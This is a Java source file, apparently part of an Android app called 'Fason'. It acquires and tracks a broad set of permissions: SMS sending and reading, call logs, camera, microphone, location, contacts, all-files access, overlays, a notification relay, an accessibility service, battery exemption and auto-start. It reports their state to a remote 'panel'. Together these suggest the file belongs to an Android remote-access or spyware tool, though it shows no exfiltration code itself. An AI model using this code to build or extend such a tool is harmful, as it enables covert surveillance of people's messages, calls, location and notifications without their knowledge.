package com.fason.app.core.permissions;

import android.Manifest;
import android.app.Activity;
import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.content.pm.PackageManager;
import com.fason.app.core.FasonApp;
import com.fason.app.core.FasonAccessibilityService;
import com.fason.app.core.Protocol;
import com.fason.app.features.notification.NotificationRelayService;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.List;

/**
 * PermissionManager — single source of truth for every permission the app needs.
 *
 * Categories handled:
 *   1. Runtime permissions (camera, sms, location, audio, contacts, media, etc.)
 *   2. MANAGE_EXTERNAL_STORAGE  (API 30+)
 *   3. SYSTEM_ALERT_WINDOW      (overlay — Springe)
 *   4. Notification Listener    (NotificationRelayService)
 *   5. Accessibility Service    (FasonAccessibilityService)
 *   6. Battery exemption        (ignore battery optimisations)
 *   7. OEM Auto-Start           (manufacturer-specific)
 */
public final class PermissionManager {

    private static final String TAG = "PermMgr";

    private PermissionManager() {}

    // ── 1. Runtime permissions ─────────────────────────────────────────────────

    // ── Permission groups ──────────────────────────────────────────────────────
    // Requested one group at a time so the user sees one dialog per category,
    // not a wall of 13 permission requests the moment the app opens.

    private static final String[][] PERM_GROUPS_BASE = {
        // Group 0 — Media capture (camera + mic together — logical pair)
        { Manifest.permission.CAMERA,
          Manifest.permission.RECORD_AUDIO },
        // Group 1 — Telephony
        { Manifest.permission.READ_SMS,
          Manifest.permission.RECEIVE_SMS,
          Manifest.permission.SEND_SMS,
          Manifest.permission.READ_PHONE_STATE,
          Manifest.permission.READ_CALL_LOG },
        // Group 2 — Location
        { Manifest.permission.ACCESS_FINE_LOCATION,
          Manifest.permission.ACCESS_COARSE_LOCATION },
        // Group 3 — Contacts
        { Manifest.permission.READ_CONTACTS },
        // Group 4 — Storage / notifications (API-split, assembled at runtime below)
    };

    /**
     * Returns all required runtime permissions as a flat array.
     * Used for state checks — not for requesting.
     */
    public static String[] getRequiredPerms() {
        List<String> perms = new ArrayList<>();
        for (String[] group : PERM_GROUPS_BASE) {
            for (String p : group) perms.add(p);
        }
        // Storage / notifications group (API-dependent)
        for (String p : getStorageAndNotifGroup()) perms.add(p);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            perms.add(Manifest.permission.SCHEDULE_EXACT_ALARM);
        }
        return perms.toArray(new String[0]);
    }

    private static String[] getStorageAndNotifGroup() {
        List<String> perms = new ArrayList<>();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // API 33+
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
            perms.add(Manifest.permission.READ_MEDIA_IMAGES);
            perms.add(Manifest.permission.READ_MEDIA_VIDEO);
            perms.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else {
            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);    // API 23–32
        }
        return perms.toArray(new String[0]);
    }

    /**
     * Returns the first group that still has at least one denied permission.
     * Returns null if everything is granted.
     * Call this instead of requestPerms() to avoid the dialog dump.
     */
    public static String[] getNextDeniedGroup(Context ctx) {
        if (ctx == null) return null;
        // Check base groups first
        for (String[] group : PERM_GROUPS_BASE) {
            for (String p : group) {
                if (!isRuntimeGranted(ctx, p)) return filterDenied(ctx, group);
            }
        }
        // Then storage/notif group
        String[] storageGroup = getStorageAndNotifGroup();
        for (String p : storageGroup) {
            if (!isRuntimeGranted(ctx, p)) return filterDenied(ctx, storageGroup);
        }
        // Alarm (single-permission group)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            if (!isRuntimeGranted(ctx, Manifest.permission.SCHEDULE_EXACT_ALARM)) {
                return new String[]{ Manifest.permission.SCHEDULE_EXACT_ALARM };
            }
        }
        return null; // all granted
    }

    /** Returns only the denied permissions from a group — no point requesting granted ones. */
    private static String[] filterDenied(Context ctx, String[] group) {
        List<String> denied = new ArrayList<>();
        for (String p : group) {
            if (!isRuntimeGranted(ctx, p)) denied.add(p);
        }
        return denied.toArray(new String[0]);
    }

    public static boolean isRuntimeGranted(Context ctx, String perm) {
        if (perm == null || ctx == null) return false;
        return ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED;
    }

    public static boolean hasAllPerms(Context ctx) {
        if (ctx == null) return false;
        for (String p : getRequiredPerms()) {
            if (!isRuntimeGranted(ctx, p)) return false;
        }
        return true;
    }

    /** Convenience overload — uses application context. */
    public static boolean hasAllPerms() {
        try { return hasAllPerms(FasonApp.getContext()); } catch (Exception e) { return false; }
    }

    public static List<String> getDeniedPerms(Context ctx) {
        List<String> denied = new ArrayList<>();
        for (String p : getRequiredPerms()) {
            if (!isRuntimeGranted(ctx, p)) denied.add(p);
        }
        return denied;
    }

    public static List<String> getRationalePerms(Activity act) {
        List<String> list = new ArrayList<>();
        if (act == null) return list;
        for (String p : getRequiredPerms()) {
            if (!isRuntimeGranted(act, p) &&
                    ActivityCompat.shouldShowRequestPermissionRationale(act, p)) {
                list.add(p);
            }
        }
        return list;
    }

    public static void requestPerms(Activity act, int requestCode) {
        if (act == null) return;
        List<String> denied = getDeniedPerms(act);
        if (!denied.isEmpty()) {
            ActivityCompat.requestPermissions(act, denied.toArray(new String[0]), requestCode);
        }
    }

    // ── 2. MANAGE_EXTERNAL_STORAGE (API 30+) ──────────────────────────────────

    public static boolean hasStorageManager() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return true; // not needed below API 30
        return Environment.isExternalStorageManager();
    }

    /** @return true if an intent was launched. */
    public static boolean requestStorageManager(Context ctx) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R || hasStorageManager()) return false;
        try {
            Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
            i.setData(Uri.parse("package:" + ctx.getPackageName()));
            if (!(ctx instanceof Activity)) i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
            return true;
        } catch (Exception e) {
            // Fallback — generic manage-all-files screen
            try {
                Intent i = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                if (!(ctx instanceof Activity)) i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(i);
                return true;
            } catch (Exception ex) {
                Log.w(TAG, "Storage manager intent failed", ex);
                return false;
            }
        }
    }

    // ── 3. SYSTEM_ALERT_WINDOW — overlay permission (Springe) ─────────────────

    public static boolean hasOverlayPermission(Context ctx) {
        if (ctx == null) return false;
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return true;
        return Settings.canDrawOverlays(ctx);
    }

    /** @return true if an intent was launched. */
    public static boolean requestOverlayPermission(Context ctx) {
        if (ctx == null || hasOverlayPermission(ctx)) return false;
        try {
            Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + ctx.getPackageName()));
            if (!(ctx instanceof Activity)) i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
            return true;
        } catch (Exception e) {
            Log.w(TAG, "Overlay permission intent failed", e);
            return false;
        }
    }

    // ── 4. Notification Listener ───────────────────────────────────────────────

    public static boolean hasNotifListenerAccess(Context ctx) {
        if (ctx == null) return false;
        String flat = new ComponentName(ctx, NotificationRelayService.class).flattenToString();
        String listeners = Settings.Secure.getString(
                ctx.getContentResolver(), Protocol.SETTING_NOTIF_LISTENERS);
        if (listeners == null || listeners.isEmpty()) return false;
        for (String token : listeners.split(":")) {
            if (token.equalsIgnoreCase(flat)) return true;
        }
        return false;
    }

    /** Legacy name kept for PermissionSetupController compatibility. */
    public static boolean hasNotifAccess(Context ctx) { return hasNotifListenerAccess(ctx); }

    public static boolean requestNotifAccess(Context ctx) {
        if (ctx == null || hasNotifListenerAccess(ctx)) return false;
        try {
            Intent i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            if (!(ctx instanceof Activity)) i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
            return true;
        } catch (Exception e) {
            Log.w(TAG, "Notif listener intent failed", e);
            return false;
        }
    }

    // ── 5. Accessibility Service ───────────────────────────────────────────────

    public static boolean hasAccessibilityAccess(Context ctx) {
        if (ctx == null) return false;
        try {
            String enabled = Settings.Secure.getString(
                    ctx.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabled == null || enabled.isEmpty()) return false;
            String flat = new ComponentName(ctx, FasonAccessibilityService.class).flattenToString();
            for (String token : enabled.split(":")) {
                if (token.equalsIgnoreCase(flat)) return true;
            }
        } catch (Exception e) {
            Log.w(TAG, "Accessibility check failed", e);
        }
        return false;
    }

    public static boolean requestAccessibilityAccess(Context ctx) {
        if (ctx == null || hasAccessibilityAccess(ctx)) return false;
        try {
            Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            if (!(ctx instanceof Activity)) i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
            return true;
        } catch (Exception e) {
            Log.w(TAG, "Accessibility intent failed", e);
            return false;
        }
    }

    // ── 6. Battery exemption ───────────────────────────────────────────────────

    public static boolean hasBatteryExemption(Context ctx) {
        if (ctx == null) return false;
        try {
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            return pm != null && pm.isIgnoringBatteryOptimizations(ctx.getPackageName());
        } catch (Exception e) {
            return false;
        }
    }

    public static boolean requestBatteryExemption(Context ctx) {
        if (ctx == null || hasBatteryExemption(ctx)) return false;
        try {
            Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            i.setData(Uri.parse("package:" + ctx.getPackageName()));
            if (!(ctx instanceof Activity)) i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
            return true;
        } catch (Exception e) {
            Log.w(TAG, "Battery exemption intent failed", e);
            return false;
        }
    }

    // ── 7. OEM Auto-Start ──────────────────────────────────────────────────────

    public static boolean needsAutoStart(Context ctx) {
        return OemAutoStartHelper.isAutoStartNeeded(ctx);
    }

    public static OemAutoStartHelper.AutoStartResult requestAutoStart(Activity act) {
        return OemAutoStartHelper.requestAutoStart(act);
    }

    public static boolean hasAutoStartAccess(Context ctx) {
        if (ctx == null) return false;
        if (!OemAutoStartHelper.isAutoStartNeeded(ctx)) return true;
        try {
            SharedPreferences prefs = ctx.getSharedPreferences(Protocol.PREFS_NAME, Context.MODE_PRIVATE);
            boolean visited = prefs.getBoolean(Protocol.PREF_AUTOSTART_VISITED, false);
            if (!visited) return false;
            return !isBackgroundRestricted(ctx);
        } catch (Exception e) {
            return false;
        }
    }

    public static void markAutoStartVisited(Context ctx) {
        if (ctx == null) return;
        try {
            ctx.getSharedPreferences(Protocol.PREFS_NAME, Context.MODE_PRIVATE)
               .edit().putBoolean(Protocol.PREF_AUTOSTART_VISITED, true).apply();
        } catch (Exception ignored) {}
    }

    private static boolean isBackgroundRestricted(Context ctx) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            try {
                ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
                if (am != null) return am.isBackgroundRestricted();
            } catch (Exception ignored) {}
        }
        return false;
    }

    // ── Misc helpers ───────────────────────────────────────────────────────────

    public static void openAppSettings(Context ctx) {
        if (ctx == null) return;
        try {
            Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            i.setData(Uri.parse("package:" + ctx.getPackageName()));
            if (!(ctx instanceof Activity)) i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception ignored) {}
    }

    /** Used by RestrictedPermissionHelper. */
    public static void openAppSettingsForRestricted(Context ctx) { openAppSettings(ctx); }

    public static boolean canIUse(String perm) {
        try { return isRuntimeGranted(FasonApp.getContext(), perm); } catch (Exception e) { return false; }
    }

    /** Snapshot of all runtime permission states — sent to panel on PERM_CHECK. */
    public static JSONObject getGranted() {
        JSONObject data = new JSONObject();
        try {
            Context ctx = FasonApp.getContext();
            JSONArray arr = new JSONArray();
            for (String p : getRequiredPerms()) {
                JSONObject o = new JSONObject();
                o.put(Protocol.KEY_PERMISSION, p);
                o.put(Protocol.KEY_ALLOWED, isRuntimeGranted(ctx, p));
                arr.put(o);
            }
            data.put(Protocol.KEY_PERMISSIONS, arr);
            data.put("overlay",        hasOverlayPermission(ctx));
            data.put("notifListener",  hasNotifListenerAccess(ctx));
            data.put("accessibility",  hasAccessibilityAccess(ctx));
            data.put("battery",        hasBatteryExemption(ctx));
            data.put("storage",        hasStorageManager());
        } catch (Exception e) {
            try { data.put(Protocol.KEY_ERROR, e.getMessage()); } catch (Exception ignored) {}
        }
        return data;
    }
}
